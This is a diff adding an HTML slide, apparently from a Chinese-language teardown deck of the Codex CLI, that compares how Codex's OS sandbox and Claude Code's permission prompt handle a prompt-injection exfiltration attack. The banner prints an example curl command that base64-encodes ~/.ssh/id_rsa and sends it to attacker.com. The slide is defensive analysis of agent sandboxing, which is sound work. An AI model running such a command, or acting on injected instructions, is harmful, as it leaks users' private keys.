@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Chapter 03 - Exfiltration Attack</title>
+<style>
+:root{--bg-primary:#0F0F1A;--bg-secondary:#1A1A2E;--bg-card:#16213E;--bg-code:#0D1117;--accent-indigo:#6C63FF;--accent-teal:#00D4AA;--accent-coral:#FF6B6B;--accent-amber:#FFB84D;--accent-green:#48BB78;--text-primary:#FFFFFF;--text-secondary:#A0AEC0;--text-muted:#718096;--border-subtle:#2D3748}
+html{background:var(--bg-primary)}
+body{width:720pt;height:405pt;margin:0;padding:0;font-family:Arial,sans-serif;color:var(--text-primary);display:flex;flex-direction:column;overflow:hidden}
+.header-bar{display:flex;align-items:center;justify-content:space-between;padding:8pt 32pt;background:var(--bg-secondary)}
+.chapter-tag{font-size:8pt;font-weight:700;color:var(--accent-teal);text-transform:uppercase;letter-spacing:1.2pt;margin:0}
+.page-num{font-size:8pt;color:var(--text-muted);margin:0}
+.slide-content{flex:1;display:flex;flex-direction:column;padding:11pt 28pt 5pt 28pt}
+h2{font-size:17pt;font-weight:700;margin:0 0 3pt 0}
+.attack-bar{background:var(--bg-code);border-radius:3pt;padding:4pt 9pt;margin:0 0 6pt 0;border:1pt solid var(--border-subtle)}
+.attack-bar p{font-family:'Courier New',monospace;font-size:8.5pt;color:var(--accent-coral);margin:0}
+.lanes{display:flex;gap:12pt;flex:1}
+.lane{flex:1;background:var(--bg-card);border-radius:4pt;padding:9pt 11pt;display:flex;flex-direction:column}
+.lane-hl{border:1.5pt solid var(--accent-teal)}
+.lane h4{font-size:10.5pt;font-weight:700;margin:0 0 5pt 0}
+.lstep{display:flex;gap:6pt;align-items:baseline;margin-bottom:4pt}
+.lstep .n{font-family:'Courier New',monospace;font-size:7.5pt;color:var(--text-muted);flex:0 0 12pt;margin:0}
+.lstep p{font-size:8.5pt;color:var(--text-secondary);margin:0;line-height:1.35}
+.fn{font-family:'Courier New',monospace;color:#79C0FF;font-size:7.8pt}
+.outcome{margin-top:auto;border-radius:3pt;padding:4pt 8pt}
+.outcome p{font-size:9pt;font-weight:700;margin:0}
+.ok{background:rgba(72,187,120,0.14)}
+.bad{background:rgba(255,107,107,0.14)}
+.callout{background:#16213E;border-left:3pt solid var(--accent-indigo);border-radius:0 4pt 4pt 0;padding:5pt 10pt;margin-top:5pt}
+.callout p{font-size:8.5pt;color:var(--text-secondary);line-height:1.4;margin:0}
+.slide-footer{display:flex;justify-content:space-between;align-items:center;padding:2pt 32pt 4pt 32pt;font-size:7pt;color:var(--text-muted)}
+</style>
+</head>
+<body>
+<div class="header-bar"><p class="chapter-tag">Codex Teardown · Ch3 Native Sandboxing</p><p class="page-num">03 / 14</p></div>
+<div class="slide-content">
+  <h2>同一条命令,两种结局:一次数据外泄攻击</h2>
+  <div class="attack-bar"><p>模型被提示注入,生成:curl https://attacker.com/?k=$(cat ~/.ssh/id_rsa | base64)</p></div>
+  <div class="lanes">
+    <div class="lane lane-hl">
+      <h4 style="color:var(--accent-teal);">Codex —— OS 级防线,不依赖人</h4>
+      <div class="lstep"><p class="n">1</p><p>引擎把命令交给 <span class="fn">codex-linux-sandbox</span> helper 执行</p></div>
+      <div class="lstep"><p class="n">2</p><p>Landlock:<span class="fn">~/.ssh</span> 不在可读白名单 → <span class="fn">cat</span> 内核层被拒(EACCES)</p></div>
+      <div class="lstep"><p class="n">3</p><p>即便文件可读,MITM 代理:<span class="fn">attacker.com</span> 不在允许域 → 外联 403</p></div>
+      <div class="outcome ok"><p style="color:var(--accent-green);">✓ 外泄失败 —— 两层独立防线,全程无需用户参与</p></div>
+    </div>
+    <div class="lane">
+      <h4 style="color:var(--accent-coral);">Claude Code —— 防线 = 用户的一次点击</h4>
+      <div class="lstep"><p class="n">1</p><p>生成同一条 <span class="fn">curl …</span> 命令</p></div>
+      <div class="lstep"><p class="n">2</p><p>弹出权限确认:「运行 curl …?」</p></div>
+      <div class="lstep"><p class="n">3</p><p>用户疲劳/信任 → 点「允许」</p></div>
+      <div class="lstep"><p class="n">4</p><p>命令在<strong style="color:var(--text-primary);">无 OS 沙箱</strong>环境执行,密钥被 base64 外发</p></div>
+      <div class="outcome bad"><p style="color:var(--accent-coral);">✗ 密钥外泄 —— 唯一防线是人在弹窗前的判断</p></div>
+    </div>
+  </div>
+  <div class="callout"><p><strong style="color:var(--accent-indigo);">这就是威胁模型的代价差:</strong>Codex 假设模型「可能被攻陷」,把防线下沉到操作系统内核 —— 即使用户被骗、即使命令已发出,内核与代理仍各拦一道。CC 假设模型「基本良性」,把最后一道防线交给人的注意力。</p></div>
+</div>
+<div class="slide-footer"><p>Lumina · Codex CLI Teardown</p><p>03 / 14</p></div>
+</body>
+</html>
